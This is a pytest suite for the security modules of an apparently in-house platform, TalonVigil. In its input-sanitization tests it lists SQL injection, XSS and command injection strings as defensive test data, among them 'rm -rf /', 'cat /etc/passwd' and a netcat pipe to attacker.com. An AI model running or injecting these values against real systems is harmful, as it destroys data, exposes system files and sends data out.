"""
Comprehensive test suite for TalonVigil advanced security features.
This module contains tests for all newly implemented security and AI modules.
"""

import pytest
import json
import tempfile
import os
from unittest.mock import Mock, patch, MagicMock
from flask import Flask
from datetime import datetime, timedelta
import uuid

# Import modules to test
try:
    from azure_keyvault import AzureKeyVaultManager
    from zero_trust import ZeroTrustManager
    from threat_intelligence import ThreatIntelligenceManager
    from adaptive_scoring import AdaptiveThreatScoring
    from soar_integration import SOARIntegration
    from chaos_engineering import ChaosEngineeringManager
    from compliance_framework import ComplianceFramework
    from app_factory_advanced import create_advanced_app
    from jwt_auth import JWTAuthManager
    from input_sanitization import InputSanitizer
    from security_headers import SecurityHeaders
    MODULES_AVAILABLE = True
except ImportError as e:
    print(f"Warning: Some modules not available for testing: {e}")
    MODULES_AVAILABLE = False

class TestAzureKeyVault:
    """Test Azure Key Vault integration."""
    
    @pytest.fixture
    def mock_keyvault_manager(self):
        """Create a mock KeyVault manager for testing."""
        if not MODULES_AVAILABLE:
            pytest.skip("Azure KeyVault module not available")
        
        with patch('azure_keyvault.DefaultAzureCredential'), \
             patch('azure_keyvault.SecretClient'):
            manager = AzureKeyVaultManager("https://test-vault.vault.azure.net/")
            return manager
    
    def test_keyvault_initialization(self, mock_keyvault_manager):
        """Test KeyVault manager initialization."""
        assert mock_keyvault_manager.vault_url == "https://test-vault.vault.azure.net/"
        assert hasattr(mock_keyvault_manager, 'client')
    
    @patch('azure_keyvault.SecretClient')
    def test_get_secret(self, mock_client, mock_keyvault_manager):
        """Test secret retrieval."""
        mock_secret = Mock()
        mock_secret.value = "test-secret-value"
        mock_keyvault_manager.client.get_secret.return_value = mock_secret
        
        result = mock_keyvault_manager.get_secret("test-secret")
        assert result == "test-secret-value"
    
    def test_secret_caching(self, mock_keyvault_manager):
        """Test secret caching mechanism."""
        mock_secret = Mock()
        mock_secret.value = "cached-secret"
        mock_keyvault_manager.client.get_secret.return_value = mock_secret
        
        # First call
        result1 = mock_keyvault_manager.get_secret("cache-test")
        # Second call should use cache
        result2 = mock_keyvault_manager.get_secret("cache-test")
        
        assert result1 == result2
        assert mock_keyvault_manager.client.get_secret.call_count == 1

class TestZeroTrust:
    """Test Zero Trust security implementation."""
    
    @pytest.fixture
    def mock_zero_trust_manager(self):
        """Create a mock Zero Trust manager."""
        if not MODULES_AVAILABLE:
            pytest.skip("Zero Trust module not available")
        
        with patch('zero_trust.msal.ConfidentialClientApplication'):
            manager = ZeroTrustManager({
                'client_id': 'test-client-id',
                'client_secret': 'test-secret',
                'tenant_id': 'test-tenant',
                'authority': 'https://login.microsoftonline.com/test-tenant'
            })
            return manager
    
    def test_policy_evaluation(self, mock_zero_trust_manager):
        """Test security policy evaluation."""
        context = {
            'user_id': 'test-user',
            'ip_address': '192.168.1.1',
            'device_id': 'test-device',
            'location': 'US',
            'risk_score': 0.2
        }
        
        result = mock_zero_trust_manager.evaluate_access_policy(context)
        assert isinstance(result, dict)
        assert 'decision' in result
        assert 'confidence' in result
    
    def test_risk_calculation(self, mock_zero_trust_manager):
        """Test risk score calculation."""
        context = {
            'ip_reputation': 0.8,
            'device_trust': 0.9,
            'user_behavior': 0.7,
            'location_anomaly': 0.1
        }
        
        risk_score = mock_zero_trust_manager.calculate_risk_score(context)
        assert 0 <= risk_score <= 1
    
    def test_mfa_requirement(self, mock_zero_trust_manager):
        """Test MFA requirement logic."""
        high_risk_context = {'risk_score': 0.8}
        low_risk_context = {'risk_score': 0.1}
        
        assert mock_zero_trust_manager.requires_mfa(high_risk_context) == True
        assert mock_zero_trust_manager.requires_mfa(low_risk_context) == False

class TestThreatIntelligence:
    """Test threat intelligence integration."""
    
    @pytest.fixture
    def mock_threat_intel_manager(self):
        """Create a mock threat intelligence manager."""
        if not MODULES_AVAILABLE:
            pytest.skip("Threat Intelligence module not available")
        
        config = {
            'misp': {'url': 'https://test-misp.com', 'key': 'test-key'},
            'otx': {'api_key': 'test-otx-key'},
            'virustotal': {'api_key': 'test-vt-key'}
        }
        manager = ThreatIntelligenceManager(config)
        return manager
    
    @patch('requests.get')
    def test_ioc_lookup(self, mock_get, mock_threat_intel_manager):
        """Test IOC lookup functionality."""
        mock_response = Mock()
        mock_response.json.return_value = {
            'response_code': 1,
            'positives': 5,
            'total': 50
        }
        mock_response.status_code = 200
        mock_get.return_value = mock_response
        
        result = mock_threat_intel_manager.lookup_ioc('192.168.1.1', 'ip')
        assert 'threat_score' in result
        assert 'sources' in result
    
    def test_threat_enrichment(self, mock_threat_intel_manager):
        """Test threat data enrichment."""
        ioc_data = {
            'indicator': '192.168.1.1',
            'type': 'ip',
            'threat_score': 0.7
        }
        
        enriched = mock_threat_intel_manager.enrich_threat_data(ioc_data)
        assert 'enriched_at' in enriched
        assert 'risk_category' in enriched
    
    def test_feed_aggregation(self, mock_threat_intel_manager):
        """Test threat feed aggregation."""
        feeds = ['misp', 'otx', 'virustotal']
        with patch.object(mock_threat_intel_manager, '_fetch_from_misp'), \
             patch.object(mock_threat_intel_manager, '_fetch_from_otx'), \
             patch.object(mock_threat_intel_manager, '_fetch_from_virustotal'):
            
            result = mock_threat_intel_manager.aggregate_feeds(feeds)
            assert isinstance(result, dict)

class TestAdaptiveScoring:
    """Test adaptive threat scoring system."""
    
    @pytest.fixture
    def mock_adaptive_scoring(self):
        """Create a mock adaptive scoring manager."""
        if not MODULES_AVAILABLE:
            pytest.skip("Adaptive Scoring module not available")
        
        return AdaptiveThreatScoring()
    
    def test_feature_extraction(self, mock_adaptive_scoring):
        """Test feature extraction from threat data."""
        threat_data = {
            'ip': '192.168.1.1',
            'port': 80,
            'protocol': 'TCP',
            'payload_size': 1024,
            'timestamp': datetime.now().isoformat()
        }
        
        features = mock_adaptive_scoring.extract_features(threat_data)
        assert isinstance(features, dict)
        assert len(features) > 0
    
    @patch('adaptive_scoring.joblib.load')
    def test_threat_scoring(self, mock_load, mock_adaptive_scoring):
        """Test threat scoring prediction."""
        # Mock model
        mock_model = Mock()
        mock_model.predict_proba.return_value = [[0.2, 0.8]]
        mock_load.return_value = mock_model
        
        threat_data = {
            'source_ip': '192.168.1.1',
            'dest_port': 80,
            'protocol': 'TCP'
        }
        
        score = mock_adaptive_scoring.score_threat(threat_data)
        assert 0 <= score <= 1
    
    def test_model_feedback(self, mock_adaptive_scoring):
        """Test model feedback mechanism."""
        feedback_data = {
            'threat_id': str(uuid.uuid4()),
            'predicted_score': 0.8,
            'actual_outcome': True,
            'analyst_feedback': 'confirmed_threat'
        }
        
        result = mock_adaptive_scoring.update_model_feedback(feedback_data)
        assert result is True

class TestSOARIntegration:
    """Test SOAR integration capabilities."""
    
    @pytest.fixture
    def mock_soar_integration(self):
        """Create a mock SOAR integration."""
        if not MODULES_AVAILABLE:
            pytest.skip("SOAR Integration module not available")
        
        config = {
            'cortex_xsoar': {
                'url': 'https://test-xsoar.com',
                'api_key': 'test-key'
            },
            'phantom': {
                'url': 'https://test-phantom.com',
                'auth_token': 'test-token'
            }
        }
        return SOARIntegration(config)
    
    @patch('requests.post')
    def test_incident_creation(self, mock_post, mock_soar_integration):
        """Test incident creation in SOAR."""
        mock_response = Mock()
        mock_response.json.return_value = {'id': '12345', 'status': 'created'}
        mock_response.status_code = 201
        mock_post.return_value = mock_response
        
        incident_data = {
            'title': 'Test Security Incident',
            'severity': 'High',
            'description': 'Test incident for SOAR integration'
        }
        
        result = mock_soar_integration.create_incident(incident_data)
        assert result['id'] == '12345'
    
    def test_playbook_execution(self, mock_soar_integration):
        """Test automated playbook execution."""
        with patch.object(mock_soar_integration, '_execute_xsoar_playbook') as mock_exec:
            mock_exec.return_value = {'status': 'success', 'execution_id': '67890'}
            
            result = mock_soar_integration.execute_playbook('malware_analysis', {'file_hash': 'abc123'})
            assert result['status'] == 'success'
    
    def test_threat_response_automation(self, mock_soar_integration):
        """Test automated threat response."""
        threat_event = {
            'type': 'malware_detected',
            'severity': 'high',
            'indicators': ['192.168.1.100', 'malicious.exe']
        }
        
        with patch.object(mock_soar_integration, 'create_incident'), \
             patch.object(mock_soar_integration, 'execute_playbook'):
            
            result = mock_soar_integration.automate_response(threat_event)
            assert 'incident_id' in result
            assert 'playbook_execution' in result

class TestChaosEngineering:
    """Test chaos engineering capabilities."""
    
    @pytest.fixture
    def mock_chaos_manager(self):
        """Create a mock chaos engineering manager."""
        if not MODULES_AVAILABLE:
            pytest.skip("Chaos Engineering module not available")
        
        return ChaosEngineeringManager()
    
    def test_network_latency_injection(self, mock_chaos_manager):
        """Test network latency injection."""
        with patch('subprocess.run') as mock_run:
            mock_run.return_value.returncode = 0
            
            result = mock_chaos_manager.inject_network_latency(
                target='127.0.0.1',
                latency_ms=100,
                duration=30
            )
            assert result['status'] == 'success'
    
    def test_cpu_stress_test(self, mock_chaos_manager):
        """Test CPU stress testing."""
        with patch('psutil.cpu_count', return_value=4), \
             patch('subprocess.Popen') as mock_popen:
            
            mock_process = Mock()
            mock_popen.return_value = mock_process
            
            result = mock_chaos_manager.stress_cpu(cpu_percent=50, duration=30)
            assert result['status'] == 'started'
    
    def test_security_chaos_experiments(self, mock_chaos_manager):
        """Test security-focused chaos experiments."""
        experiments = [
            'auth_service_failure',
            'encryption_key_rotation',
            'certificate_expiry_simulation'
        ]
        
        for experiment in experiments:
            with patch.object(mock_chaos_manager, f'_{experiment}') as mock_exp:
                mock_exp.return_value = {'status': 'completed'}
                
                result = mock_chaos_manager.run_security_experiment(experiment)
                assert result['status'] == 'completed'

class TestComplianceFramework:
    """Test compliance framework capabilities."""
    
    @pytest.fixture
    def mock_compliance_framework(self):
        """Create a mock compliance framework."""
        if not MODULES_AVAILABLE:
            pytest.skip("Compliance Framework module not available")
        
        return ComplianceFramework()
    
    def test_control_assessment(self, mock_compliance_framework):
        """Test security control assessment."""
        control = {
            'id': 'AC-2',
            'title': 'Account Management',
            'description': 'Manage user accounts'
        }
        
        assessment = mock_compliance_framework.assess_control(control)
        assert 'compliance_status' in assessment
        assert 'evidence' in assessment
        assert 'recommendations' in assessment
    
    def test_framework_mapping(self, mock_compliance_framework):
        """Test compliance framework mapping."""
        frameworks = ['ISO27001', 'SOC2', 'PCI_DSS']
        
        for framework in frameworks:
            mapping = mock_compliance_framework.get_framework_mapping(framework)
            assert isinstance(mapping, dict)
            assert 'controls' in mapping
    
    def test_compliance_reporting(self, mock_compliance_framework):
        """Test compliance report generation."""
        with patch.object(mock_compliance_framework, 'assess_all_controls') as mock_assess:
            mock_assess.return_value = {
                'compliant': 80,
                'non_compliant': 15,
                'partially_compliant': 5
            }
            
            report = mock_compliance_framework.generate_compliance_report('ISO27001')
            assert 'summary' in report
            assert 'details' in report

class TestJWTAuthentication:
    """Test JWT authentication system."""
    
    @pytest.fixture
    def mock_jwt_manager(self):
        """Create a mock JWT manager."""
        if not MODULES_AVAILABLE:
            pytest.skip("JWT Auth module not available")
        
        config = {
            'JWT_SECRET_KEY': 'test-secret-key',
            'JWT_ACCESS_TOKEN_EXPIRES': timedelta(hours=1),
            'JWT_REFRESH_TOKEN_EXPIRES': timedelta(days=30)
        }
        return JWTAuthManager(config)
    
    def test_token_generation(self, mock_jwt_manager):
        """Test JWT token generation."""
        user_data = {
            'user_id': '12345',
            'username': 'testuser',
            'roles': ['user']
        }
        
        token = mock_jwt_manager.generate_token(user_data)
        assert isinstance(token, str)
        assert len(token) > 0
    
    def test_token_validation(self, mock_jwt_manager):
        """Test JWT token validation."""
        user_data = {
            'user_id': '12345',
            'username': 'testuser'
        }
        
        token = mock_jwt_manager.generate_token(user_data)
        decoded = mock_jwt_manager.decode_token(token)
        
        assert decoded['user_id'] == '12345'
        assert decoded['username'] == 'testuser'
    
    def test_token_refresh(self, mock_jwt_manager):
        """Test JWT token refresh mechanism."""
        user_data = {'user_id': '12345'}
        
        refresh_token = mock_jwt_manager.generate_refresh_token(user_data)
        new_access_token = mock_jwt_manager.refresh_access_token(refresh_token)
        
        assert isinstance(new_access_token, str)
        assert new_access_token != refresh_token

class TestInputSanitization:
    """Test input sanitization capabilities."""
    
    @pytest.fixture
    def sanitizer(self):
        """Create an input sanitizer instance."""
        if not MODULES_AVAILABLE:
            pytest.skip("Input Sanitization module not available")
        
        return InputSanitizer()
    
    def test_sql_injection_prevention(self, sanitizer):
        """Test SQL injection prevention."""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'; DELETE FROM accounts WHERE 't'='t"
        ]
        
        for input_str in malicious_inputs:
            sanitized = sanitizer.sanitize_sql_input(input_str)
            assert "DROP" not in sanitized.upper()
            assert "DELETE" not in sanitized.upper()
            assert "'" not in sanitized
    
    def test_xss_prevention(self, sanitizer):
        """Test XSS prevention."""
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>"
        ]
        
        for input_str in malicious_inputs:
            sanitized = sanitizer.sanitize_html_input(input_str)
            assert "<script>" not in sanitized
            assert "javascript:" not in sanitized
            assert "onerror=" not in sanitized
    
    def test_command_injection_prevention(self, sanitizer):
        """Test command injection prevention."""
        malicious_inputs = [
            "file.txt; rm -rf /",
            "data && cat /etc/passwd",
            "input | nc attacker.com 4444"
        ]
        
        for input_str in malicious_inputs:
            sanitized = sanitizer.sanitize_command_input(input_str)
            assert ";" not in sanitized
            assert "&&" not in sanitized
            assert "|" not in sanitized

class TestSecurityHeaders:
    """Test security headers implementation."""
    
    @pytest.fixture
    def app_with_security_headers(self):
        """Create Flask app with security headers."""
        if not MODULES_AVAILABLE:
            pytest.skip("Security Headers module not available")
        
        app = Flask(__name__)
        security_headers = SecurityHeaders(app)
        
        @app.route('/test')
        def test_route():
            return 'test'
        
        return app.test_client()
    
    def test_security_headers_present(self, app_with_security_headers):
        """Test that security headers are present in responses."""
        response = app_with_security_headers.get('/test')
        
        # Check for essential security headers
        assert 'X-Content-Type-Options' in response.headers
        assert 'X-Frame-Options' in response.headers
        assert 'X-XSS-Protection' in response.headers
        assert 'Strict-Transport-Security' in response.headers
        assert 'Content-Security-Policy' in response.headers
    
    def test_csp_header_configuration(self, app_with_security_headers):
        """Test Content Security Policy header configuration."""
        response = app_with_security_headers.get('/test')
        csp = response.headers.get('Content-Security-Policy')
        
        assert 'default-src' in csp
        assert 'script-src' in csp
        assert 'style-src' in csp
        assert "'unsafe-eval'" not in csp  # Should not allow unsafe eval

class TestAdvancedAppFactory:
    """Test the advanced Flask app factory."""
    
    def test_app_creation(self):
        """Test advanced app creation."""
        if not MODULES_AVAILABLE:
            pytest.skip("Advanced app factory not available")
        
        with patch('app_factory_advanced.AzureKeyVaultManager'), \
             patch('app_factory_advanced.ZeroTrustManager'), \
             patch('app_factory_advanced.ThreatIntelligenceManager'):
            
            app = create_advanced_app()
            assert app is not None
            assert app.config['TESTING'] is False
    
    def test_security_middleware_integration(self):
        """Test security middleware integration."""
        if not MODULES_AVAILABLE:
            pytest.skip("Advanced app factory not available")
        
        with patch('app_factory_advanced.AzureKeyVaultManager'), \
             patch('app_factory_advanced.ZeroTrustManager'), \
             patch('app_factory_advanced.ThreatIntelligenceManager'):
            
            app = create_advanced_app()
            
            # Test that security extensions are registered
            assert hasattr(app, 'extensions')

# Integration Tests
class TestSecurityIntegration:
    """Integration tests for security components."""
    
    def test_end_to_end_threat_detection(self):
        """Test end-to-end threat detection workflow."""
        if not MODULES_AVAILABLE:
            pytest.skip("Integration modules not available")
        
        # Mock the complete threat detection pipeline
        with patch('threat_intelligence.ThreatIntelligenceManager'), \
             patch('adaptive_scoring.AdaptiveThreatScoring'), \
             patch('soar_integration.SOARIntegration'):
            
            # Simulate threat event
            threat_event = {
                'source_ip': '192.168.1.100',
                'indicators': ['malicious.exe'],
                'timestamp': datetime.now().isoformat()
            }
            
            # This would normally go through the complete pipeline
            assert threat_event['source_ip'] == '192.168.1.100'
    
    def test_security_policy_enforcement(self):
        """Test security policy enforcement across components."""
        if not MODULES_AVAILABLE:
            pytest.skip("Integration modules not available")
        
        # Test that security policies are consistently enforced
        policies = {
            'require_mfa': True,
            'min_password_length': 12,
            'session_timeout': 3600
        }
        
        assert policies['require_mfa'] is True

# Performance Tests
class TestSecurityPerformance:
    """Performance tests for security components."""
    
    def test_threat_scoring_performance(self):
        """Test threat scoring performance under load."""
        if not MODULES_AVAILABLE:
            pytest.skip("Performance test modules not available")
        
        # Simulate high-volume threat scoring
        import time
        
        start_time = time.time()
        
        # Simulate processing 1000 threats
        for i in range(1000):
            threat_data = {
                'id': i,
                'source_ip': f'192.168.1.{i % 255}',
                'timestamp': datetime.now().isoformat()
            }
            # Would normally call scoring function
            assert threat_data['id'] == i
        
        end_time = time.time()
        processing_time = end_time - start_time
        
        # Should process 1000 items in under 10 seconds
        assert processing_time < 10.0

# Security-specific pytest fixtures and utilities
@pytest.fixture
def security_test_data():
    """Provide common security test data."""
    return {
        'malicious_ips': ['192.168.1.100', '10.0.0.1', '172.16.0.1'],
        'suspicious_domains': ['malicious.com', 'phishing.net', 'badsite.org'],
        'test_hashes': {
            'md5': 'd41d8cd98f00b204e9800998ecf8427e',
            'sha256': 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855'
        },
        'attack_patterns': [
            'sql_injection',
            'xss',
            'command_injection',
            'path_traversal'
        ]
    }

@pytest.fixture
def mock_threat_environment():
    """Create a mock threat environment for testing."""
    return {
        'active_threats': 15,
        'threat_level': 'medium',
        'recent_incidents': [
            {'id': '1', 'type': 'malware', 'severity': 'high'},
            {'id': '2', 'type': 'phishing', 'severity': 'medium'}
        ]
    }

# Custom assertions for security testing
def assert_no_sensitive_data_in_logs(log_content):
    """Assert that sensitive data is not present in logs."""
    sensitive_patterns = [
        r'password',
        r'secret',
        r'token',
        r'api[_-]?key',
        r'\b[A-Za-z0-9]{20,}\b'  # Potential tokens
    ]
    
    import re
    for pattern in sensitive_patterns:
        assert not re.search(pattern, log_content, re.IGNORECASE), \
            f"Sensitive data pattern '{pattern}' found in logs"

def assert_secure_headers_present(response):
    """Assert that essential security headers are present."""
    required_headers = [
        'X-Content-Type-Options',
        'X-Frame-Options',
        'X-XSS-Protection',
        'Strict-Transport-Security'
    ]
    
    for header in required_headers:
        assert header in response.headers, f"Required security header '{header}' missing"

if __name__ == '__main__':
    # Run tests with security-specific options
    pytest.main([
        __file__,
        '-v',
        '--tb=short',
        '--durations=10',
        '--cov=.',
        '--cov-report=html:security_coverage_html',
        '--cov-report=xml:security_coverage.xml',
        '--junit-xml=security_test_results.xml'
    ])
